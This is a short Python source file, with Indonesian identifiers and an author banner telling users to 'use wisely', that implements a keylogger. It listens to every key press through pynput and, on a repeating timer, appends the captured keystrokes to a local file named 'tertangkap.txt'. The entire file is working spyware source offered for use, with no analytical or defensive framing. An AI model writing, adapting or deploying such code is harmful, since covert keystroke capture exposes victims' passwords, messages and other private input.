#!/usr/bin/env python

import pynput.keyboard
import  threading

log = ""

class Rekkeyb:
    def __init__(self, time_interval):
        self.log = ""
        self.interval = time_interval
        penutupan = '''
            dibuat dengan niat oleh 
             ______   _ _   _ _   _ _______________
            |__  / | | | \ | | | | |__  /__  /__  /
              / /| | | |  \| | | | | / /  / /  / / 
             / /_| |_| | |\  | |_| |/ /_ / /_ / /_ 
            /____|\___/|_| \_|\___//____/____/____|

            https://steamcommunity.com/id/zunuzzz/

            =========GUNAKAN DENGAN BIJAK=========
            '''

        print(penutupan)

    def appenkelog(self, string):
        self.log = self.log + string

    def prosestekankey_nuz(self, key):
        try:
            keyskrng = str(key.char)
        except AttributeError:
            if key == key.space:
                keyskrng = " "
            else:
                keyskrng = " " + str(key) + " "
        self.appenkelog(keyskrng)

    def simpanfile_nuz(self):
        with open("tertangkap.txt", "a") as file:
            file.write(self.log + "\n")
        self.log = ""

    def lapor_nuz(self):
        self.simpanfile_nuz()
        pewaktu = threading.Timer(self.interval, self.lapor_nuz)
        pewaktu.start()

    def mulai(self):
        dengerkey_nuz = pynput.keyboard.Listener(on_press=self.prosestekankey_nuz)
        with dengerkey_nuz:
            self.lapor_nuz()
            dengerkey_nuz.join()
